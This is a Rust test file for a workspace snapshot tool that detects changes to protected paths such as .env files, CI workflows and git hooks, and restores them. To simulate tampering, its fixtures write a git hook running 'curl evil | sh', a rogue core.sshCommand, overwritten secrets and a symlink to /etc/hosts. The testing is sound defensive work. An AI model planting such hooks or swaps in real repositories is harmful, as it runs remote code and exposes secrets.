//! Real-filesystem tests of the bounded workspace snapshot (FIX-06): what a
//! process changed in the tree, what the path policy says about it, and
//! putting protected paths back.

use std::path::Path;
use std::process::Command;

use modbit_workspace::PathPolicy;
use modbit_workspace::snapshot::{ChangeKind, Limits, capture, diff, restore};

fn git(dir: &Path, args: &[&str]) {
    let out = Command::new("git")
        .arg("-C")
        .arg(dir)
        .args(args)
        .env("GIT_AUTHOR_NAME", "t")
        .env("GIT_AUTHOR_EMAIL", "t@e")
        .env("GIT_COMMITTER_NAME", "t")
        .env("GIT_COMMITTER_EMAIL", "t@e")
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&out.stderr)
    );
}

fn tree() -> (tempfile::TempDir, PathPolicy) {
    let root = tempfile::tempdir().unwrap();
    let p = root.path();
    std::fs::create_dir_all(p.join("src")).unwrap();
    std::fs::create_dir_all(p.join(".github/workflows")).unwrap();
    std::fs::create_dir_all(p.join("target/debug")).unwrap();
    std::fs::create_dir_all(p.join("node_modules/dep")).unwrap();
    std::fs::write(p.join("src/main.rs"), "fn main() {}\n").unwrap();
    std::fs::write(p.join(".env"), "SECRET=1\n").unwrap();
    std::fs::write(p.join(".github/workflows/ci.yml"), "name: ci\n").unwrap();
    std::fs::write(p.join("target/debug/out.bin"), "build\n").unwrap();
    std::fs::write(p.join("node_modules/dep/index.js"), "x\n").unwrap();
    git(p, &["init", "-q", "-b", "main"]);
    git(p, &["add", "-A"]);
    git(p, &["commit", "-q", "-m", "base", "--no-verify"]);
    let policy = PathPolicy::new(p, &[]).unwrap();
    (root, policy)
}

#[test]
fn the_diff_names_added_modified_and_deleted_paths_and_the_policy_marks_protected_ones() {
    let (root, policy) = tree();
    let p = root.path();
    let before = capture(&policy, Limits::default());
    assert!(!before.incomplete);
    std::fs::write(p.join("src/main.rs"), "fn main() { 1 }\n").unwrap();
    std::fs::write(p.join("src/new.rs"), "pub fn n() {}\n").unwrap();
    std::fs::write(p.join(".env"), "SECRET=2\n").unwrap();
    std::fs::remove_file(p.join(".github/workflows/ci.yml")).unwrap();
    std::fs::write(p.join(".env.production"), "KEY=1\n").unwrap();
    // generated and vendored trees are not walked
    std::fs::write(p.join("target/debug/out.bin"), "rebuilt\n").unwrap();
    std::fs::write(p.join("node_modules/dep/index.js"), "y\n").unwrap();
    let after = capture(&policy, Limits::default());
    let d = diff(&before, &after, &policy);
    let by: Vec<(&str, ChangeKind, bool)> = d
        .iter()
        .map(|x| (x.path.as_str(), x.kind, x.protected_by.is_some()))
        .collect();
    assert_eq!(
        by,
        vec![
            (".env", ChangeKind::Modified, true),
            (".env.production", ChangeKind::Added, true),
            (".github/workflows/ci.yml", ChangeKind::Deleted, true),
            ("src/main.rs", ChangeKind::Modified, false),
            ("src/new.rs", ChangeKind::Added, false),
        ]
    );
    let m = d.iter().find(|x| x.path == "src/main.rs").unwrap();
    assert_eq!(m.before.as_deref().map(str::len), Some(64));
    assert_ne!(m.before, m.after);
    // identical trees diff to nothing
    assert!(diff(&after, &capture(&policy, Limits::default()), &policy).is_empty());
}

#[test]
fn git_hooks_and_config_are_watched_though_git_itself_is_not_walked() {
    let (root, policy) = tree();
    let p = root.path();
    let before = capture(&policy, Limits::default());
    // ordinary git traffic is invisible ...
    std::fs::write(p.join("a.txt"), "a\n").unwrap();
    git(p, &["add", "a.txt"]);
    git(p, &["commit", "-q", "-m", "a", "--no-verify"]);
    let quiet = diff(&before, &capture(&policy, Limits::default()), &policy);
    assert_eq!(
        quiet.iter().map(|d| d.path.as_str()).collect::<Vec<_>>(),
        ["a.txt"],
        "{quiet:?}"
    );
    // ... but a hook or the config is not
    std::fs::write(p.join(".git/hooks/pre-commit"), "#!/bin/sh\ncurl x\n").unwrap();
    git(p, &["config", "core.sshCommand", "evil"]);
    let d = diff(&before, &capture(&policy, Limits::default()), &policy);
    let paths: Vec<&str> = d.iter().map(|x| x.path.as_str()).collect();
    assert!(paths.contains(&".git/hooks/pre-commit"), "{paths:?}");
    assert!(paths.contains(&".git/config"), "{paths:?}");
    assert!(
        d.iter()
            .filter(|x| x.path.starts_with(".git/"))
            .all(|x| x.protected_by.is_some())
    );
}

#[test]
fn a_linked_worktree_watches_the_common_git_directory() {
    let (root, _policy) = tree();
    let wt = tempfile::tempdir().unwrap();
    let wt_path = wt.path().join("wt");
    git(
        root.path(),
        &[
            "worktree",
            "add",
            "-q",
            wt_path.to_str().unwrap(),
            "-b",
            "topic",
        ],
    );
    let policy = PathPolicy::new(&wt_path, &[]).unwrap();
    let before = capture(&policy, Limits::default());
    std::fs::write(root.path().join(".git/hooks/post-checkout"), "#!/bin/sh\n").unwrap();
    let d = diff(&before, &capture(&policy, Limits::default()), &policy);
    assert_eq!(
        d.iter().map(|x| x.path.as_str()).collect::<Vec<_>>(),
        [".git/hooks/post-checkout"],
        "{d:?}"
    );
}

#[test]
fn restore_puts_protected_paths_back_exactly_and_verifies_them() {
    let (root, policy) = tree();
    let p = root.path();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::write(p.join(".git/hooks/pre-push"), "#!/bin/sh\nexit 0\n").unwrap();
        std::fs::set_permissions(
            p.join(".git/hooks/pre-push"),
            std::fs::Permissions::from_mode(0o755),
        )
        .unwrap();
    }
    let before = capture(&policy, Limits::default());
    std::fs::write(p.join(".env"), "SECRET=stolen\n").unwrap();
    std::fs::remove_file(p.join(".github/workflows/ci.yml")).unwrap();
    std::fs::write(p.join(".env.production"), "KEY=1\n").unwrap();
    std::fs::write(p.join("src/main.rs"), "fn main() { 2 }\n").unwrap();
    #[cfg(unix)]
    std::fs::write(p.join(".git/hooks/pre-push"), "#!/bin/sh\ncurl evil | sh\n").unwrap();
    let after = capture(&policy, Limits::default());
    let d = diff(&before, &after, &policy);
    let protected: Vec<_> = d.iter().filter(|x| x.protected_by.is_some()).collect();
    assert!(protected.len() >= 3);
    let r = restore(&before, &protected);
    assert!(r.unrestored.is_empty(), "{r:?}");
    assert_eq!(
        std::fs::read_to_string(p.join(".env")).unwrap(),
        "SECRET=1\n"
    );
    assert_eq!(
        std::fs::read_to_string(p.join(".github/workflows/ci.yml")).unwrap(),
        "name: ci\n"
    );
    assert!(!p.join(".env.production").exists());
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        assert_eq!(
            std::fs::read_to_string(p.join(".git/hooks/pre-push")).unwrap(),
            "#!/bin/sh\nexit 0\n"
        );
        assert_eq!(
            std::fs::metadata(p.join(".git/hooks/pre-push"))
                .unwrap()
                .permissions()
                .mode()
                & 0o111,
            0o111,
            "the executable bit is restored too"
        );
    }
    // the unprotected change is untouched
    assert_eq!(
        std::fs::read_to_string(p.join("src/main.rs")).unwrap(),
        "fn main() { 2 }\n"
    );
    // after the restore the protected surface diffs clean
    let again = diff(&before, &capture(&policy, Limits::default()), &policy);
    assert_eq!(
        again.iter().map(|x| x.path.as_str()).collect::<Vec<_>>(),
        ["src/main.rs"]
    );
}

#[cfg(unix)]
#[test]
fn a_protected_symlink_swap_is_detected_and_a_file_too_large_to_retain_is_named() {
    let (root, policy) = tree();
    let p = root.path();
    // a big protected file: detected, cannot be restored, and says so
    std::fs::write(p.join("id_rsa.big"), vec![b'k'; 4096]).unwrap();
    let limits = Limits {
        max_retained_file_bytes: 1024,
        ..Limits::default()
    };
    let _ = limits;
    let policy2 = PathPolicy::new(p, &["**/id_rsa.big".to_owned()]).unwrap();
    let before = capture(&policy2, limits);
    std::fs::write(p.join("id_rsa.big"), vec![b'z'; 4096]).unwrap();
    // `.env` replaced by a link to outside the tree
    std::fs::remove_file(p.join(".env")).unwrap();
    std::os::unix::fs::symlink("/etc/hosts", p.join(".env")).unwrap();
    let after = capture(&policy2, limits);
    let d = diff(&before, &after, &policy2);
    let protected: Vec<_> = d.iter().filter(|x| x.protected_by.is_some()).collect();
    assert_eq!(protected.len(), 2, "{d:?}");
    let env = d.iter().find(|x| x.path == ".env").unwrap();
    assert!(
        env.after.as_deref().unwrap().starts_with("symlink:"),
        "{env:?}"
    );
    let r = restore(&before, &protected);
    assert_eq!(r.restored, [".env"], "{r:?}");
    assert_eq!(r.unrestored.len(), 1);
    assert_eq!(r.unrestored[0].0, "id_rsa.big");
    assert!(r.unrestored[0].1.contains("not retained"), "{r:?}");
    assert_eq!(
        std::fs::read_to_string(p.join(".env")).unwrap(),
        "SECRET=1\n"
    );
    let _ = policy;
}

#[test]
fn the_walk_is_bounded_and_an_incomplete_snapshot_never_invents_additions_or_deletions() {
    let (root, policy) = tree();
    let p = root.path();
    for i in 0..40 {
        std::fs::write(p.join(format!("src/f{i}.rs")), format!("{i}\n")).unwrap();
    }
    let small = Limits {
        max_entries: 10,
        ..Limits::default()
    };
    let before = capture(&policy, small);
    assert!(before.incomplete);
    assert!(before.scanned <= 10);
    std::fs::write(p.join("src/zzz-new.rs"), "n\n").unwrap();
    let after = capture(&policy, small);
    let d = diff(&before, &after, &policy);
    assert!(
        d.iter().all(|x| x.kind == ChangeKind::Modified),
        "an incomplete walk reports only what it can prove: {d:?}"
    );
    // a file over the hash cap is fingerprinted, and still noticed when it grows
    let big = Limits {
        max_hashed_file_bytes: 8,
        ..Limits::default()
    };
    std::fs::write(p.join("src/large.txt"), "0123456789abcdef").unwrap();
    let b = capture(&policy, big);
    std::fs::write(p.join("src/large.txt"), "0123456789abcdefXYZ").unwrap();
    let d = diff(&b, &capture(&policy, big), &policy);
    assert!(
        d.iter()
            .any(|x| x.path == "src/large.txt" && x.kind == ChangeKind::Modified),
        "{d:?}"
    );
}
